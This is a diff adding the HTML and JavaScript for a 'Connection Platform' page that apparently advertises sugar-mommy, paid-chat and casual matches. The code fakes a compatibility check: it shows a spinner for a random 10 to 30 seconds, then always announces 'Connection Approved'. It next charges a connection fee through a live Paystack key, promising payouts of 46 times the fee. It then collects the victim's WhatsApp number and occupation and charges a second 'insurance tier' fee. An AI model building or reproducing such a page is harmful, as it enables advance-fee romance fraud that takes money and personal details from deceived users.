@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connection Platform - Profile Matching</title>
+    <script src="https://js.paystack.co/v2/inline.js"></script>
+    <style>
+        :root {
+            --bg-color: #0b141a;
+            --card-bg: #202c33;
+            --accent-color: #00a884;
+            --text-color: #e9edef;
+            --input-bg: #2a3942;
+            --btn-blue: #09a5db;
+            --danger-color: #f87171;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background: var(--bg-color); color: var(--text-color); padding: 16px; max-width: 600px; margin: 0 auto; }
+        
+        header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 16px; border-bottom: 1px solid #222d34; margin-bottom: 20px; }
+        h1 { font-size: 18px; color: var(--accent-color); }
+        .nav-link { color: #8696a0; text-decoration: none; font-size: 13px; }
+        .refund-btn { background: rgba(248, 113, 113, 0.15); color: var(--danger-color); padding: 6px 12px; border-radius: 6px; text-decoration: none; font-size: 12px; font-weight: bold; }
+
+        .grid-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 14px; }
+        .profile-card { background: var(--card-bg); border-radius: 10px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.2); display: flex; flex-direction: column; }
+        .profile-card img { width: 100%; height: 200px; object-fit: cover; }
+        .profile-card .info { padding: 10px; flex: 1; display: flex; flex-direction: column; justify-content: space-between; }
+        
+        .btn-primary { background: var(--accent-color); color: #111b21; border: none; width: 100%; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 8px; font-size: 14px; }
+        .btn-blue { background: var(--btn-blue); color: #fff; border: none; width: 100%; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 8px; font-size: 14px; }
+
+        /* Modal Popup */
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); justify-content: center; align-items: center; padding: 16px; z-index: 99; }
+        .modal-box { background: var(--card-bg); padding: 24px; border-radius: 12px; width: 100%; max-width: 440px; text-align: center; max-height: 90vh; overflow-y: auto; }
+        .modal-box h3 { margin-bottom: 12px; color: var(--accent-color); font-size: 18px; }
+        .modal-box p { font-size: 14px; color: #8696a0; margin-bottom: 16px; line-height: 1.4; text-align: left; }
+        .modal-box input, .modal-box select { width: 100%; padding: 12px; border-radius: 8px; border: none; background: var(--input-bg); color: #fff; margin-bottom: 12px; font-size: 14px; outline: none; }
+        
+        /* Spinner */
+        .spinner { border: 4px solid rgba(255,255,255,0.1); width: 48px; height: 48px; border-radius: 50%; border-left-color: var(--accent-color); animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .tier-list { text-align: left; background: var(--input-bg); padding: 14px; border-radius: 8px; margin-bottom: 16px; font-size: 13px; line-height: 1.6; }
+        .tier-list ol { padding-left: 18px; }
+        .tier-list li { margin-bottom: 8px; color: var(--text-color); }
+
+        .close-btn { background: transparent; color: #8696a0; border: none; margin-top: 14px; cursor: pointer; font-size: 13px; }
+        .calc-payout { background: rgba(0, 168, 132, 0.15); border: 1px solid var(--accent-color); padding: 10px; border-radius: 8px; color: var(--accent-color); font-weight: bold; margin-bottom: 12px; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+<header>
+    <a href="index.html" class="nav-link">← Categories</a>
+    <h1 id="pageTitle">Match Gallery</h1>
+    <a href="mailto:connectionplatform.ng@gmail.com?subject=Refund%20Request" class="refund-btn">Request Refund</a>
+</header>
+
+<div class="grid-container" id="galleryGrid"></div>
+
+<!-- Flow Modal -->
+<div class="modal-overlay" id="flowModal">
+    <div class="modal-box" id="modalContent">
+        <!-- Content inserted dynamically by JavaScript -->
+    </div>
+</div>
+
+<script>
+    const GITHUB_USERNAME = "gempluto";
+    const REPO_NAME = "my-project";
+    const PAYSTACK_KEY = "pk_live_88ba11e7af2c83ef0e73e19768947cdf5c2c124f";
+
+    // Auto-detect current category key from filename
+    let categoryKey = window.location.pathname.split('/').pop().replace('.html', '') || 'sugar_mommy';
+    let userState = {
+        selectedPhoto: '',
+        userMatchPhoto: null,
+        connectionFee: 0,
+        whatsapp: '',
+        occupation: '',
+        selectedTierFee: 0
+    };
+
+    window.addEventListener('DOMContentLoaded', () => {
+        const catName = localStorage.getItem('selected_category_name') || categoryKey.replace('_', ' ').toUpperCase();
+        document.getElementById('pageTitle').innerText = catName;
+        loadGalleryPhotos();
+    });
+
+    async function loadGalleryPhotos() {
+        const grid = document.getElementById('galleryGrid');
+        grid.innerHTML = "<p style='grid-column: 1/-1; text-align:center;'>Loading profiles...</p>";
+
+        try {
+            const response = await fetch(`https://api.github.com/repos/${GITHUB_USERNAME}/${REPO_NAME}/contents/images/${categoryKey}`);
+            const files = await response.json();
+
+            if (!Array.isArray(files)) {
+                grid.innerHTML = "<p style='grid-column: 1/-1; text-align:center;'>No profiles available in this folder yet.</p>";
+                return;
+            }
+
+            const images = files.filter(f => f.name.match(/\.(jpg|jpeg|png|webp)$/i));
+            if (images.length === 0) {
+                grid.innerHTML = "<p style='grid-column: 1/-1; text-align:center;'>No profiles uploaded yet.</p>";
+                return;
+            }
+
+            grid.innerHTML = '';
+            images.forEach((img) => {
+                grid.innerHTML += `
+                    <div class="profile-card">
+                        <img src="${img.download_url}" alt="Match Profile">
+                        <div class="info">
+                            <button class="btn-primary" onclick="startConnectFlow('${img.download_url}')">Get Connected Now</button>
+                        </div>
+                    </div>
+                `;
+            });
+        } catch (err) {
+            grid.innerHTML = "<p style='grid-column: 1/-1; text-align:center;'>Error loading photos.</p>";
+        }
+    }
+
+    function openModal() {
+        document.getElementById('flowModal').style.display = 'flex';
+    }
+
+    function closeModal() {
+        document.getElementById('flowModal').style.display = 'none';
+    }
+
+    /* STEP 1: Upload Personal Picture */
+    function startConnectFlow(imgUrl) {
+        userState.selectedPhoto = imgUrl;
+        const modal = document.getElementById('modalContent');
+        modal.innerHTML = `
+            <h3>Upload Your Photo</h3>
+            <p>Please select your clear photo to submit to your prospective match for verification:</p>
+            <input type="file" id="userPhotoInput" accept="image/*">
+            <button class="btn-primary" onclick="processUpload()">Submit Photo</button>
+            <br>
+            <button class="close-btn" onclick="closeModal()">Cancel</button>
+        `;
+        openModal();
+    }
+
+    /* STEP 2: Random Countdown Timer (10s to 30s - Hidden Timer) */
+    function processUpload() {
+        const fileInput = document.getElementById('userPhotoInput');
+        if (!fileInput.files[0]) return alert("Please select a photo first.");
+        userState.userMatchPhoto = fileInput.files[0];
+
+        const modal = document.getElementById('modalContent');
+        modal.innerHTML = `
+            <h3>Verifying Compatibility</h3>
+            <div class="spinner"></div>
+            <p style="text-align:center;">Please wait while we send your profile picture and check if the person you selected is interested in connecting with you...</p>
+        `;
+
+        // Random duration between 10,000ms (10s) and 30,000ms (30s)
+        const randomWaitTime = Math.floor(Math.random() * (30000 - 10000 + 1)) + 10000;
+
+        setTimeout(() => {
+            renderApprovalStep();
+        }, randomWaitTime);
+    }
+
+    /* STEP 3: Connection Approved */
+    function renderApprovalStep() {
+        const modal = document.getElementById('modalContent');
+        modal.innerHTML = `
+            <h3 style="color:#00a884;">Connection Approved! 🎉</h3>
+            <p style="text-align:center;">Great news! The match you selected has confirmed their interest in connecting with you.</p>
+            <button class="btn-primary" onclick="showConnectionFeeStep()">Click this button to get your match's contact</button>
+        `;
+    }
+
+    /* STEP 4: Category Base Message & Connection Fee Agreement */
+    function showConnectionFeeStep() {
+        const modal = document.getElementById('modalContent');
+
+        if (categoryKey === 'sugar_mommy') {
+            modal.innerHTML = `
+                <h3>Connection Fee Agreement</h3>
+                <p>Your match has approved their interest! To finalize, a connection fee is required to cover profile verification. For example, if your connection fee is ₦20,000, you would be paid ₦920,000 per service. So how much can you afford to pay for the connection fee?</p>
+                <input type="number" id="customFeeInput" placeholder="Enter amount (₦4,500 - ₦20,000)" oninput="calculateSugarPayout(this.value)">
+                <div id="payoutCalcDisplay" class="calc-payout" style="display:none;"></div>
+                <button class="btn-primary" onclick="validateAndPaySugarFee()">Agree & Pay Connection Fee</button>
+            `;
+        } else if (categoryKey === 'paid_chat') {
+            userState.connectionFee = 4500;
+            modal.innerHTML = `
+                <h3>Connection Fee Agreement</h3>
+                <p>Your match has approved their interest! To finalize, a connection fee of ₦4,500 is required to cover profile verification and you would be paid ₦180,000 per service. Do you agree?</p>
+                <button class="btn-primary" onclick="payConnectionFee(4500)">YES, I AGREE (Pay ₦4,500)</button>
+                <button class="close-btn" onclick="closeModal()">NO</button>
+            `;
+        } else if (['serious_ng', 'serious_int'].includes(categoryKey)) {
+            userState.connectionFee = 4000;
+            modal.innerHTML = `
+                <h3>Connection Fee Agreement</h3>
+                <p>Your match has approved their interest! To finalize, a connection fee of ₦4,000 is required to cover profile verification. Do you agree?</p>
+                <button class="btn-primary" onclick="payConnectionFee(4000)">YES, I AGREE (Pay ₦4,000)</button>
+                <button class="close-btn" onclick="closeModal()">NO</button>
+            `;
+        } else {
+            // Casual, FWB, Media exchange, Private video, Social group
+            userState.connectionFee = 3000;
+            modal.innerHTML = `
+                <h3>Connection Fee Agreement</h3>
+                <p>Your match has approved their interest! To finalize, a connection fee of ₦3,000 is required to cover profile verification. Do you agree?</p>
+                <button class="btn-primary" onclick="payConnectionFee(3000)">YES, I AGREE (Pay ₦3,000)</button>
+                <button class="close-btn" onclick="closeModal()">NO</button>
+            `;
+        }
+    }
+
+    function calculateSugarPayout(val) {
+        const amount = parseInt(val);
+        const display = document.getElementById('payoutCalcDisplay');
+        if (!isNaN(amount) && amount >= 4500 && amount <= 20000) {
+            const payout = amount * 46;
+            display.style.display = 'block';
+            display.innerText = `Expected Payout: ₦${payout.toLocaleString()} per service`;
+        } else {
+            display.style.display = 'none';
+        }
+    }
+
+    function validateAndPaySugarFee() {
+        const val = parseInt(document.getElementById('customFeeInput').value);
+        if (isNaN(val) || val < 4500) {
+            return alert("The minimum connection fee is ₦4,500. Please select a valid amount between ₦4,500 and ₦20,000.");
+        }
+        if (val > 20000) {
+            return alert("The maximum connection fee is ₦20,000. Please select an amount within range.");
+        }
+        userState.connectionFee = val;
+        payConnectionFee(val);
+    }
+
+    function payConnectionFee(amount) {
+        const userName = localStorage.getItem('user_name') || "Customer";
+        const popup = new PaystackPop();
+        popup.newTransaction({
+            key: PAYSTACK_KEY,
+            email: userName.replace(/\s+/g, '').toLowerCase() + '@connectionplatform.com',
+            amount: amount * 100,
+            currency: 'NGN',
+            onSuccess: function(trx) {
+                renderWhatsAppStep();
+            },
+            onCancel: function() {
+                alert("Payment was not completed.");
+            }
+        });
+    }
+
+    /* STEP 5: Final Key Verified & WhatsApp Number Prompt */
+    function renderWhatsAppStep() {
+        const modal = document.getElementById('modalContent');
+        modal.innerHTML = `
+            <h3 style="color:#00a884;">Final Key Verified ✅</h3>
+            <p>To facilitate seamless group integration, kindly share your active WhatsApp phone number:</p>
+            <input type="text" id="whatsappInput" placeholder="e.g. 08012345678">
+            <button class="btn-primary" onclick="saveWhatsApp()">Continue →</button>
+        `;
+    }
+
+    function saveWhatsApp() {
+        const phone = document.getElementById('whatsappInput').value.trim();
+        if (!phone) return alert("Please enter your WhatsApp number.");
+        userState.whatsapp = phone;
+        renderOccupationStep();
+    }
+
+    /* STEP 6: Occupation Prompt */
+    function renderOccupationStep() {
+        const modal = document.getElementById('modalContent');
+        modal.innerHTML = `
+            <h3>Profile Compatibility</h3>
+            <p>To help us verify profile compatibility, what is your current occupation or primary line of work?</p>
+            <input type="text" id="occupationInput" placeholder="e.g. Business Owner / Engineer">
+            <button class="btn-primary" onclick="saveOccupation()">Continue →</button>
+        `;
+    }
+
+    function saveOccupation() {
+        const occ = document.getElementById('occupationInput').value.trim();
+        if (!occ) return alert("Please enter your occupation.");
+        userState.occupation = occ;
+        renderTierStep();
+    }
+
+    /* STEP 7: Speed & Insurance Tier Selection */
+    function renderTierStep() {
+        const modal = document.getElementById('modalContent');
+        modal.innerHTML = `
+            <h3>Choose Insurance & Speed Tier</h3>
+            <p>Please choose your preferred release speed and coverage tier to complete connection setup:</p>
+            
+            <div class="tier-list">
+                <ol>
+                    <li><strong>Basic Tier (₦2,500):</strong> Connection access released within 24 hours.</li>
+                    <li><strong>Fast-Track Tier (₦5,500):</strong> Connection access released within 5 hours + 2-Year Profile Insurance.</li>
+                    <li><strong>Instant Tier (₦10,500):</strong> Connection access released within 1 hour + Lifetime Profile Insurance.</li>
+                </ol>
+                <p style="margin-top:8px; font-weight:bold; color:#00a884;">Which tier works for you?</p>
+            </div>
+
+            <select id="tierSelect">
+                <option value="2500">1. Basic Tier — ₦2,500</option>
+                <option value="5500">2. Fast-Track Tier — ₦5,500</option>
+                <option value="10500">3. Instant Tier — ₦10,500</option>
+            </select>
+
+            <button class="btn-blue" onclick="payTierFee()">Proceed to Pay Tier Fee</button>
+        `;
+    }
+
+    function payTierFee() {
+        const tierFee = parseInt(document.getElementById('tierSelect').value);
+        userState.selectedTierFee = tierFee;
+
+        const userName = localStorage.getItem('user_name') || "Customer";
+        const popup = new PaystackPop();
+        popup.newTransaction({
+            key: PAYSTACK_KEY,
+            email: userName.replace(/\s+/g, '').toLowerCase() + '@connectionplatform.com',
+            amount: tierFee * 100,
+            currency: 'NGN',
+            onSuccess: function(trx) {
+                renderFinalSuccess();
+            },
+            onCancel: function() {
+                alert("Tier payment was not completed.");
+            }
+        });
+    }
+
+    /* STEP 8: Final Completion Screen */
+    function renderFinalSuccess() {
+        const modal = document.getElementById('modalContent');
+        modal.innerHTML = `
+            <h3 style="color:#00a884;">Setup Complete! 🎉</h3>
+            <p style="text-align:center;">Your details have been successfully verified. Our dispatch team will reach out to your WhatsApp number (<strong>${userState.whatsapp}</strong>) within your chosen release timeframe.</p>
+            <a href="mailto:connectionplatform.ng@gmail.com" class="nav-link" style="display:block; text-align:center; margin-top:10px;">Need help? Contact support</a>
+            <button class="btn-primary" onclick="closeModal()">Done</button>
+        `;
+    }
+</script>
+</body>
+</html>
